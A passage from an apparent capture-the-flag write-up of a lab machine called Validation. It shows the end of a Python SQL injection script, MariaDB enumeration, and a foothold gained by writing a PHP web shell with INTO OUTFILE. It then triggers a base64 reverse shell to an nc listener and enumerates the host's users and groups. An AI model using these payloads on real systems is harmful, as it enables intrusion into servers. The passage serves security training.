z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">; -- -<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span></span><span class="z-meta z-mapping z-python"><span class="z-punctuation z-section z-mapping z-end z-python">}</span></span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python">        <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Send a POST request with the payload to the target URL
+</span></span><span class="z-source z-python">        <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">response</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">requests</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">post</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">url</span></span><span class="z-punctuation z-separator z-arguments z-python">,</span> <span class="z-variable z-parameter z-python">data</span><span class="z-keyword z-operator z-assignment z-python">=</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">data</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python">        <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Parse the HTML response using BeautifulSoup
+</span></span><span class="z-source z-python">        <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">soup</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">BeautifulSoup</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">response</span><span class="z-punctuation z-accessor z-dot z-python">.</span><span class="z-meta z-generic-name z-python">text</span></span><span class="z-punctuation z-separator z-arguments z-python">,</span> <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">html.parser<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python">        <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Check if the response contains a &lt;li&gt; element
+</span></span><span class="z-source z-python">        <span class="z-meta z-statement z-conditional z-if z-python"><span class="z-keyword z-control z-conditional z-if z-python">if</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">soup</span><span class="z-punctuation z-accessor z-dot z-python">.</span><span class="z-meta z-generic-name z-python">li</span></span><span class="z-punctuation z-section z-block z-conditional z-if z-python">:</span></span>
+</span><span class="z-source z-python">            <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Print the text content of all &lt;li&gt; elements found in the response
+</span></span><span class="z-source z-python">            <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-support z-function z-builtin z-python">print</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-python">\n</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">join</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-sequence z-list z-python"><span class="z-punctuation z-section z-sequence z-begin z-python">[</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">x</span><span class="z-punctuation z-accessor z-dot z-python">.</span><span class="z-meta z-generic-name z-python">text</span></span> <span class="z-meta z-expression z-generator z-python"><span class="z-keyword z-control z-loop z-for z-generator z-python">for</span> <span class="z-meta z-generic-name z-python">x</span> <span class="z-keyword z-control z-loop z-for z-in z-python">in</span></span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">soup</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">findAll</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">li<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span><span class="z-punctuation z-section z-sequence z-end z-python">]</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python">    <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Define behavior for an empty line (do nothing)
+</span></span><span class="z-source z-python"><span class="z-meta z-function z-python">    <span class="z-storage z-type z-function z-python"><span class="z-keyword z-declaration z-function z-python">def</span></span> <span class="z-entity z-name z-function z-python"><span class="z-meta z-generic-name z-python">emptyline</span></span></span><span class="z-meta z-function z-parameters z-python"><span class="z-punctuation z-section z-parameters z-begin z-python">(</span></span><span class="z-meta z-function z-parameters z-python"><span class="z-variable z-parameter z-python">self</span><span class="z-punctuation z-section z-parameters z-end z-python">)</span></span><span class="z-meta z-function z-python"><span class="z-punctuation z-section z-function z-begin z-python">:</span></span>
+</span><span class="z-source z-python">        <span class="z-keyword z-control z-flow z-pass z-python">pass</span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python">    <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Define behavior for the &#39;exit&#39; command
+</span></span><span class="z-source z-python"><span class="z-meta z-function z-python">    <span class="z-storage z-type z-function z-python"><span class="z-keyword z-declaration z-function z-python">def</span></span> <span class="z-entity z-name z-function z-python"><span class="z-meta z-generic-name z-python">do_exit</span></span></span><span class="z-meta z-function z-parameters z-python"><span class="z-punctuation z-section z-parameters z-begin z-python">(</span></span><span class="z-meta z-function z-parameters z-python"><span class="z-variable z-parameter z-python">self</span><span class="z-punctuation z-section z-parameters z-end z-python">)</span></span><span class="z-meta z-function z-python"><span class="z-punctuation z-section z-function z-begin z-python">:</span></span>
+</span><span class="z-source z-python">        <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Return True to exit the command loop
+</span></span><span class="z-source z-python">        <span class="z-keyword z-control z-flow z-return z-python">return</span> <span class="z-constant z-language z-python">True</span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python">
+</span><span class="z-source z-python"><span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Entry point of the script
+</span></span><span class="z-source z-python"><span class="z-meta z-statement z-conditional z-if z-python"><span class="z-keyword z-control z-conditional z-if z-python">if</span> <span class="z-meta z-qualified-name z-python"><span class="z-support z-variable z-magic z-python">__name__</span></span> <span class="z-keyword z-operator z-comparison z-python">==</span> <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">__main__<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-section z-block z-conditional z-if z-python">:</span></span>
+</span><span class="z-source z-python">    <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Create an instance of the custom command-line interpreter and start the command loop
+</span></span><span class="z-source z-python">    <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">MyCmd</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">cmdloop</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span></code></pre>
+<p>I'll save it as <code>sqli.py</code> and I'll reset the box to clear all my previous SQLi
+attempts and have a cleaner output. Then, I'll run this script.</p>
+<h3 id="mariadb">MariaDB</h3>
+<p>Let's explore the database we got access to using our SQLi.</p>
+<h4 id="version">Version</h4>
+<p>First, we want to know which database and which version Validation is using to
+store the registrations, in order to choose the correct commands.</p>
+<pre data-lang="sql" class="language-sql z-code"><code class="language-sql" data-lang="sql"><span class="z-source z-sql"><span class="z-keyword z-operator z-comparison z-sql">&gt;</span> <span class="z-keyword z-other z-DML z-sql">SELECT</span> @@version
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">10.5.11-MariaDB-1
+</span></code></pre>
+<p>Alright! So this is MariaDB version <code>10.5.11</code>, a fork of MySQL.</p>
+<h4 id="databases">Databases</h4>
+<p>Now, let's see which databases are available.</p>
+<pre data-lang="sql" class="language-sql z-code"><code class="language-sql" data-lang="sql"><span class="z-source z-sql"><span class="z-keyword z-operator z-comparison z-sql">&gt;</span> <span class="z-keyword z-other z-DML z-sql">SELECT</span> schema_name <span class="z-keyword z-other z-DML z-sql">FROM</span> <span class="z-constant z-other z-database-name z-sql">information_schema</span>.<span class="z-constant z-other z-table-name z-sql">schemata</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">information_schema
+</span><span class="z-text z-plain">performance_schema
+</span><span class="z-text z-plain">mysql
+</span><span class="z-text z-plain">registration
+</span></code></pre>
+<p>So this instance contains four databases. Only of them is a non-default MySQL
+database though: <code>registration</code>.</p>
+<h4 id="registration-s-tables"><code>registration</code>'s tables</h4>
+<p>Let's see which tables are included in this database.</p>
+<pre data-lang="sql" class="language-sql z-code"><code class="language-sql" data-lang="sql"><span class="z-source z-sql"><span class="z-keyword z-operator z-comparison z-sql">&gt;</span> <span class="z-keyword z-other z-DML z-sql">SELECT</span> table_name <span class="z-keyword z-other z-DML z-sql">FROM</span> <span class="z-constant z-other z-database-name z-sql">information_schema</span>.<span class="z-constant z-other z-table-name z-sql">tables</span> <span class="z-keyword z-other z-DML z-sql">WHERE</span> table_schema <span class="z-keyword z-operator z-comparison z-sql">=</span> <span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span>registration<span class="z-punctuation z-definition z-string z-end z-sql">&#39;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">registration
+</span></code></pre>
+<p>So there's a single table named <code>registration</code>, like the name of the database.</p>
+<h4 id="registration-s-columns"><code>registration</code>'s columns</h4>
+<p>Let's continue our enumeration of this database by checking the content of the
+table we discovered.</p>
+<pre data-lang="sql" class="language-sql z-code"><code class="language-sql" data-lang="sql"><span class="z-source z-sql"><span class="z-keyword z-operator z-comparison z-sql">&gt;</span> <span class="z-keyword z-other z-DML z-sql">SELECT</span> column_name <span class="z-keyword z-other z-DML z-sql">FROM</span> <span class="z-constant z-other z-database-name z-sql">information_schema</span>.<span class="z-constant z-other z-table-name z-sql">columns</span> <span class="z-keyword z-other z-DML z-sql">WHERE</span> table_name <span class="z-keyword z-operator z-comparison z-sql">=</span> <span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span>registration<span class="z-punctuation z-definition z-string z-end z-sql">&#39;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">username
+</span><span class="z-text z-plain">userhash
+</span><span class="z-text z-plain">country
+</span><span class="z-text z-plain">regtime
+</span></code></pre>
+<p>Alright, so this table holds four columns. Their names are not really
+interesting though, it doesn't look like we will find a password or anything to
+connect to Validation. If we explore them, we see that we were correct: these
+columns simply contain the values for our registration.</p>
+<p>So the content of this database is useless to us.</p>
+<h4 id="user">User</h4>
+<p>Let's check the name of the current user we have access to in the context of the
+database session.</p>
+<pre data-lang="sql" class="language-sql z-code"><code class="language-sql" data-lang="sql"><span class="z-source z-sql"><span class="z-keyword z-operator z-comparison z-sql">&gt;</span> <span class="z-keyword z-other z-DML z-sql">SELECT</span> user<span class="z-meta z-block z-sql"><span class="z-punctuation z-section z-scope z-begin z-sql">(</span><span class="z-punctuation z-section z-scope z-end z-sql">)</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">uhc@localhost
+</span></code></pre>
+<p>We're <code>uhc</code>. The <code>localhost</code> confirms that this database is hosted locally on
+Validation.</p>
+<h4 id="permissions">Permissions</h4>
+<p>Let's check our permissions. Maybe we'll find something interesting?</p>
+<pre data-lang="sql" class="language-sql z-code"><code class="language-sql" data-lang="sql"><span class="z-source z-sql"><span class="z-keyword z-operator z-comparison z-sql">&gt;</span> <span class="z-keyword z-other z-DML z-sql">SELECT</span> privilege_type <span class="z-keyword z-other z-DML z-sql">FROM</span> <span class="z-constant z-other z-database-name z-sql">information_schema</span>.<span class="z-constant z-other z-table-name z-sql">user_privileges</span> <span class="z-keyword z-other z-DML z-sql">WHERE</span> grantee <span class="z-keyword z-operator z-comparison z-sql">=</span> <span class="z-string z-quoted z-double z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&quot;</span>&#39;uhc&#39;@&#39;localhost&#39;<span class="z-punctuation z-definition z-string z-end z-sql">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">SELECT
+</span><span class="z-text z-plain">INSERT
+</span><span class="z-text z-plain">UPDATE
+</span><span class="z-text z-plain">DELETE
+</span><span class="z-text z-plain">CREATE
+</span><span class="z-text z-plain">DROP
+</span><span class="z-text z-plain">RELOAD
+</span><span class="z-text z-plain">SHUTDOWN
+</span><span class="z-text z-plain">PROCESS
+</span><span class="z-text z-plain">FILE
+</span><span class="z-text z-plain">REFERENCES
+</span><span class="z-text z-plain">INDEX
+</span><span class="z-text z-plain">ALTER
+</span><span class="z-text z-plain">SHOW DATABASES
+</span><span class="z-text z-plain">SUPER
+</span><span class="z-text z-plain">CREATE TEMPORARY TABLES
+</span><span class="z-text z-plain">LOCK TABLES
+</span><span class="z-text z-plain">EXECUTE
+</span><span class="z-text z-plain">REPLICATION SLAVE
+</span><span class="z-text z-plain">BINLOG MONITOR
+</span><span class="z-text z-plain">CREATE VIEW
+</span><span class="z-text z-plain">SHOW VIEW
+</span><span class="z-text z-plain">CREATE ROUTINE
+</span><span class="z-text z-plain">ALTER ROUTINE
+</span><span class="z-text z-plain">CREATE USER
+</span><span class="z-text z-plain">EVENT
+</span><span class="z-text z-plain">TRIGGER
+</span><span class="z-text z-plain">CREATE TABLESPACE
+</span><span class="z-text z-plain">DELETE HISTORY
+</span><span class="z-text z-plain">SET USER
+</span><span class="z-text z-plain">FEDERATED ADMIN
+</span><span class="z-text z-plain">CONNECTION ADMIN
+</span><span class="z-text z-plain">READ_ONLY ADMIN
+</span><span class="z-text z-plain">REPLICATION SLAVE ADMIN
+</span><span class="z-text z-plain">REPLICATION MASTER ADMIN
+</span><span class="z-text z-plain">BINLOG ADMIN
+</span><span class="z-text z-plain">BINLOG REPLAY
+</span><span class="z-text z-plain">SLAVE MONITOR
+</span></code></pre>
+<p>Our command returned a bunch of permissions, but one stands out from the rest:
+<code>FILE</code>.</p>
+<h2 id="foothold-sqli">Foothold (SQLi)</h2>
+<p>We just found out that we have the rights to read and write to files. This means
+that in theory, we should be able to write our own files on the web server!</p>
+<h3 id="preparation">Preparation</h3>
+<p>First, I'll setup a listener to receive the shell.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> rlwrap nc<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>lvnp</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>9001<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>Then, I'll choose the Base64 encoded version of the 'Bash -i' payload from
+<a href="https://www.revshells.com/">RevShells</a> configured to obtain a <code>/bin/bash</code>
+shell.</p>
+<p>We still need to find a way to execute our payload. Luckily we know that the
+website is using PHP, so it should be pretty easy to obtain one by executing our
+payload as an OS command like that:</p>
+<pre data-lang="php" class="language-php z-code"><code class="language-php" data-lang="php"><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-line z-php"><span class="z-punctuation z-section z-embedded z-begin z-php">&lt;?php</span></span><span class="z-meta z-embedded z-line z-php"><span class="z-source z-php"> <span class="z-meta z-function-call z-php"><span class="z-support z-function z-exec z-php">system</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&#39;</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">/bin/echo &lt;BASE64_REVSHELL_PAYLOAD&gt; | /usr/bin/base64 -d | /bin/bash -i</span><span class="z-punctuation z-definition z-string z-end z-php">&#39;</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span> </span><span class="z-punctuation z-section z-embedded z-end z-php">?&gt;</span><span class="z-meta z-html-newline-after-php z-php">
+</span></span></span></span></code></pre>
+<h3 id="exploitation">Exploitation</h3>
+<p>Let's use our script to write our payload into a <code>revshell.php</code> file:</p>
+<pre data-lang="sql" class="language-sql z-code"><code class="language-sql" data-lang="sql"><span class="z-source z-sql"><span class="z-keyword z-operator z-comparison z-sql">&gt;</span> <span class="z-keyword z-other z-DML z-sql">SELECT</span> <span class="z-string z-quoted z-double z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&quot;</span>&lt;?php system(&#39;/bin/echo &lt;BASE64_REVSHELL_PAYLOAD&gt; | /usr/bin/base64 -d | /bin/bash -i&#39;) ?&gt;<span class="z-punctuation z-definition z-string z-end z-sql">&quot;</span></span> INTO outfile <span class="z-string z-quoted z-double z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&quot;</span>/var/www/html/revshell.php<span class="z-punctuation z-definition z-string z-end z-sql">&quot;</span></span>
+</span></code></pre>
+<p>Now let's trigger our payload.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>o</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/dev/null<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://10.10.11.116/revshell.php<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>If we check our listener:</p>
+<pre class="z-code"><code><span class="z-text z-plain">connect to [10.10.14.9] from (UNKNOWN) [10.10.11.116] 55896
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">www-data@validation:/var/www/html$
+</span></code></pre>
+<p>It caught the reverse shell!</p>
+<h3 id="spawning-a-pty">Spawning a pty</h3>
+<p>Let's use this one-liner to spawn a pty:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">script</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/dev/null<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>qc</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/bin/bash<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<h2 id="getting-a-lay-of-the-land">Getting a lay of the land</h2>
+<p>If we run <code>whoami</code>, we see that we got a foothold as <code>www-data</code>.</p>
+<h3 id="architecture">Architecture</h3>
+<p>What is Validation's architecture?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">www-data@validation:/var/www/html$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>m</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">x86_64
+</span></code></pre>
+<p>It's using x86_64. Let's keep that in mind to select the appropriate binaries.</p>
+<h3 id="distribution">Distribution</h3>
+<p>Let's see which distribution Validation is using.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">www-data@validation:/var/www/html$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/os-release<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">PRETTY_NAME=&quot;Debian GNU/Linux 11 (bullseye)&quot;
+</span><span class="z-text z-plain">NAME=&quot;Debian GNU/Linux&quot;
+</span><span class="z-text z-plain">VERSION_ID=&quot;11&quot;
+</span><span class="z-text z-plain">VERSION=&quot;11 (bullseye)&quot;
+</span><span class="z-text z-plain">VERSION_CODENAME=bullseye
+</span><span class="z-text z-plain">ID=debian
+</span><span class="z-text z-plain">HOME_URL=&quot;https://www.debian.org/&quot;
+</span><span class="z-text z-plain">SUPPORT_URL=&quot;https://www.debian.org/support&quot;
+</span><span class="z-text z-plain">BUG_REPORT_URL=&quot;https://bugs.debian.org/&quot;
+</span></code></pre>
+<p>Okay, so it's Debian 11.</p>
+<h3 id="kernel">Kernel</h3>
+<p>Let's find the kernel version of Validation.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">www-data@validation:/var/www/html$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>r</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">5.4.0-81-generic
+</span></code></pre>
+<p>It's <code>5.4.0</code>.</p>
+<h3 id="users">Users</h3>
+<p>Let's enumerate all users.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">www-data@validation:/var/www/html$</span></span><span class="z-meta z-function-call z-arguments z-shell"> grep <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>.*sh$<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/passwd<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>:<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">root
+</span></code></pre>
+<p>There's only <code>root</code>.</p>
+<h3 id="groups">Groups</h3>
+<p>Let's enumerate all groups.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">www-data@validation:/var/www/html$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/group<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>:<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">adm
+</span><span class="z-text z-plain">audio
+</span><span class="z-text z-plain">backup
+</span><span class="z-text z-plain">bin
+</span><span class="z-text z-plain">cdrom
+</span><span class="z-text z-plain">daemon
+</span><span class="z-text z-plain">dialout
+</span><span class="z-text z-plain">dip
+</span><span class="z-text z-plain">disk
+</span><span class="z-text z-plain">fax
+</span><span class="z-text z-plain">floppy
+</span><span class="z-text z-plain">games
+</span><span class="z-text z-plain">gnats
+</span><span class="z-text z-plain">irc
+</span><span class="z-text z-plain">kmem
+</span><span class="z-text z-plain">list
+</span><span class="z-text z-plain">lp
+</span><span class="z-text z-plain">mail
+</span><span class="z-text z-plain">man
+</span><span class="z-text z-plain">messagebus
+</span><span class="z-text z-plain">mysql
+</span><span class="z-text z-plain">news
+</span><span class="z-text z-plain">nogroup
+</span><span class="z-text z-plain">operator
+</span><span class="z-text z-plain">plugdev
+</span><span class="z-text z-plain">proxy
+</span><span class="z-text z-plain">root
+</span><span class="z-text z-plain">sasl
+</span><span class="z-text z-plain">shadow
+</span><span class="z-text z-plain">src
+</span><span class="z-text z-plain">ssh
+</span><span class="z-text z-plain">staff
+</span><span class="z-text z-plain">sudo
+</span><span class="z-text z-plain">sys
+</span><span class="z-text z-plain">systemd-journal
+</span><span class="z-text z-plain">systemd-network
+</span><span class="z-text z-plain">systemd-resolve
+</span><span class="z-text z-plain">systemd-timesync
+</span><span class="z-text z-plain">tape
+</span><span class="z-text z-plain">tty
+</span><span class="z-text z-plain">users
+</span><span class="z-text z-plain">utmp
+</span><span class="z-text z-plain">uucp
+</span><span class="z-text z-plain">video
+</span><span class="z-text z-plain">voice
+</span><span class="z-text z-plain">www-data
+</span></code></pre>
+<h3 id="nics">NICs</h3>
+<p>Let's gather the list of connected NICs.</p>
